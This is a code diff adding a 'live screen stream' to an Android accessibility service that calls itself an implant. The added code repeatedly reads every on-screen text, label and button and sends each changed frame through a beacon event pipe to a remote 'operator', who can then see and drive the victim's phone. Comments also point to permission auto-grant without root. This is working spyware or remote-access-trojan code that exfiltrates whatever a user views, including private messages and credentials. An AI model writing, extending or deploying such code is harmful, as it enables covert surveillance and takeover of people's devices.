@@ -221,6 +221,111 @@ try {
     }
 
     // ------------------------------------------------------------------
+    // Live semantic screen stream
+    // ------------------------------------------------------------------
+
+    /**
+     * Throttled, change-gated screen projection pushed down the EXISTING event
+     * pipe (ShadowCore.logEvent -> push_event -> /t/recv -> DO implant_events).
+     *
+     * Deliberately not a screenshot. The beacon is a 25s long-poll and cannot
+     * carry pixels continuously; the node tree is what it can afford, and it is
+     * enough both to see the screen and to drive it via clickNodeById /
+     * clickByText. Pixel capture stays a separate on-demand command.
+     *
+     * Two guards matter and neither is optional:
+     *  - change-gate: a static screen produces identical projections, so it
+     *    costs nothing. Without this the DO is flooded by idle animations.
+     *  - node cap: bounds the frame size on dense screens.
+     */
+    @Volatile private var streamOn = false
+    private var streamIntervalMs = 800L
+    private var streamMaxNodes = 120
+    private var lastFrameHash = 0
+    private val streamHandler = Handler(Looper.getMainLooper())
+
+    private val streamTick = object : Runnable {
+        override fun run() {
+            if (!streamOn) return
+            try {
+                pushScreenFrame()
+            } catch (e: Throwable) {
+                Log.w("ShadowA11y", "screen stream frame failed: ${e.message}")
+            }
+            if (streamOn) streamHandler.postDelayed(this, streamIntervalMs)
+        }
+    }
+
+    /** Enable/disable the stream. Safe to call repeatedly. */
+    fun setScreenStream(on: Boolean, intervalMs: Int, maxNodes: Int): String {
+        streamIntervalMs = intervalMs.coerceIn(200, 10_000).toLong()
+        streamMaxNodes = maxNodes.coerceIn(10, 400)
+        streamHandler.removeCallbacks(streamTick)
+        streamOn = on
+        if (!on) return "screen stream OFF"
+        lastFrameHash = 0 // force one frame immediately so the operator sees content
+        streamHandler.post(streamTick)
+        return "screen stream ON every ${streamIntervalMs}ms (max $streamMaxNodes nodes)"
+    }
+
+    /**
+     * Build the projection and push it if it changed.
+     * Frame shape (one node per line, first line the package):
+     *   [SCREEN][<pkg>]
+     *   <l>,<t>,<r>,<b>|<clickable 0/1>|<view-id>|<text>|<desc>
+     * Bounds are included so the operator can lay the screen out spatially
+     * rather than as a flat list.
+     */
+    private fun pushScreenFrame() {
+        val root = rootInActiveWindow ?: return
+        val sb = StringBuilder()
+        sb.append("[SCREEN][").append(root.packageName?.toString() ?: "?").append("]\n")
+        val count = intArrayOf(0)
+        projectNode(root, sb, count)
+        val frame = sb.toString()
+        val h = frame.hashCode()
+        if (h == lastFrameHash) return // unchanged: send nothing
+        lastFrameHash = h
+        com.shadow.ShadowCore.logEvent(frame)
+    }
+
+    private fun projectNode(node: AccessibilityNodeInfo?, sb: StringBuilder, count: IntArray) {
+        if (node == null || count[0] >= streamMaxNodes) return
+        try {
+            val text = node.text?.toString() ?: ""
+            val desc = node.contentDescription?.toString() ?: ""
+            val id = node.viewIdResourceName ?: ""
+            // Skip pure layout containers: they carry nothing and would dominate
+            // the frame on a dense screen.
+            if (text.isNotBlank() || desc.isNotBlank() || node.isClickable) {
+                count[0]++
+                val r = android.graphics.Rect()
+                node.getBoundsInScreen(r)
+                sb.append(r.left).append(',').append(r.top).append(',')
+                    .append(r.right).append(',').append(r.bottom).append('|')
+                    .append(if (node.isClickable) "1" else "0").append('|')
+                    .append(id.substringAfterLast('/')).append('|')
+                    .append(text.replace('\n', ' ').take(60)).append('|')
+                    .append(desc.replace('\n', ' ').take(40)).append('\n')
+            }
+            for (i in 0 until node.childCount) {
+                if (count[0] >= streamMaxNodes) break
+                val child = node.getChild(i) ?: continue
+                try {
+                    projectNode(child, sb, count)
+                } finally {
+                    // getChild() returns an owned copy -- must be recycled or the
+                    // a11y node pool exhausts after a few dumps on some OEM skins.
+                    @Suppress("DEPRECATION")
+                    child.recycle()
+                }
+            }
+        } catch (e: Throwable) {
+            // Node pool churn on some OEM skins: drop this node, keep streaming.
+        }
+    }
+
+    // ------------------------------------------------------------------
     // Permission auto-grant (replaces pm grant — works with no root)
     // ------------------------------------------------------------------
 
